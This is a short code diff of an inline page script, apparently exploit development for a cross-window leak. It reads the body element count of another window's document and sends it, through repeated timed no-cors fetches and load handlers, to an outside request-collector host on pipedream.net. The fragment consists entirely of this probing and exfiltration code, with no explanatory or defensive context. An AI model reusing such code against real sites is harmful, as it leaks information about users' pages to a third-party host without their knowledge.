@@ -4,7 +4,7 @@
 
 <script>
 
-async function testWait(aaa) {
+const yolo = async function testWait(aaa) {
     await wait(5000);
     fetch('https://en6gc9c8vfzvo.x.pipedream.net/?size=4' + aaa.document.body.childElementCount, {mode: 'no-cors'})
     await wait(5000);
@@ -36,11 +36,7 @@ try{
 
 	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?size3=' + aaa.document.body.childElementCount, {mode: 'no-cors'});
 
-	wait(5000);
-    fetch('https://en6gc9c8vfzvo.x.pipedream.net/?size=4' + aaa.document.body.childElementCount, {mode: 'no-cors'})
-    wait(5000);
-    fetch('https://en6gc9c8vfzvo.x.pipedream.net/?size=5' + aaa.document.body.childElementCount, {mode: 'no-cors'})
-
+	
 	testWait(aaa)
 	aaa.onload = function() {fetch('https://en6gc9c8vfzvo.x.pipedream.net/?loaded0', {mode: 'no-cors'});}
 	aaa.addEventListener('load', function() {
